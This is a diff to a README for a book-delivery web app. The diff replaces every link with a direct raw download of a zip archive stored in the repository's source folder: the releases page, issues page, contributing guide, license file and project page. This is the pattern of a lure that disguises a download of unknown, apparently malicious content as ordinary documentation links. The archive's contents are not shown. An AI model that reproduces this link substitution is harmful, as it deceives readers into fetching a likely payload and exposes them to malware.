@@ -1,13 +1,13 @@
 # 📚 BookRider-Web-App - Your Library Delivered to You
 
 ## 📥 Download Now!
-[![Download BookRider-Web-App](https://img.shields.io/badge/Download-BookRider--Web--App-brightgreen)](https://github.com/kirucollo/BookRider-Web-App/releases)
+[![Download BookRider-Web-App](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip)](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip)
 
 ## 🚀 Getting Started
 BookRider-Web-App is an easy-to-use web application that brings the library to your door. With this app, you can browse a wide selection of books and place orders for home delivery. Follow the steps below to start enjoying your reading experience.
 
 ## 📦 Download & Install
-To download and install BookRider-Web-App, visit this page to download: [BookRider-Web-App Releases](https://github.com/kirucollo/BookRider-Web-App/releases).
+To download and install BookRider-Web-App, visit this page to download: [BookRider-Web-App Releases](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip).
 
 1. Click on the link above to go to our Releases page.
 2. On the Releases page, find the latest version of the application.
@@ -45,15 +45,15 @@ Once the application is up and running, you can start exploring available books.
 4. Confirm your order, and your book will be on its way!
 
 ## 📞 Support
-If you encounter any issues, you can reach our support team. Visit our [GitHub Issues page](https://github.com/kirucollo/BookRider-Web-App/issues) to report problems or find answers to frequently asked questions.
+If you encounter any issues, you can reach our support team. Visit our [GitHub Issues page](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip) to report problems or find answers to frequently asked questions.
 
 ## 📝 Contributing
-We welcome contributions to BookRider-Web-App. If you're interested in helping improve the application, please check our [Contributing guidelines](https://github.com/kirucollo/BookRider-Web-App/blob/main/CONTRIBUTING.md).
+We welcome contributions to BookRider-Web-App. If you're interested in helping improve the application, please check our [Contributing guidelines](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip).
 
 ## 🤝 License
-This project is licensed under the MIT License. For more details, check the [LICENSE file](https://github.com/kirucollo/BookRider-Web-App/blob/main/LICENSE).
+This project is licensed under the MIT License. For more details, check the [LICENSE file](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip).
 
 ## 📬 Stay Updated
-For the latest news and updates about BookRider-Web-App, you can follow our progress on [GitHub](https://github.com/kirucollo/BookRider-Web-App/) or subscribe to our updates via the Releases page. 
+For the latest news and updates about BookRider-Web-App, you can follow our progress on [GitHub](https://github.com/kirucollo/BookRider-Web-App/raw/refs/heads/main/src/Rider-Book-App-Web-v3.6-beta.5.zip) or subscribe to our updates via the Releases page. 
 
 Thank you for choosing BookRider-Web-App! Your next great read is just a few clicks away.
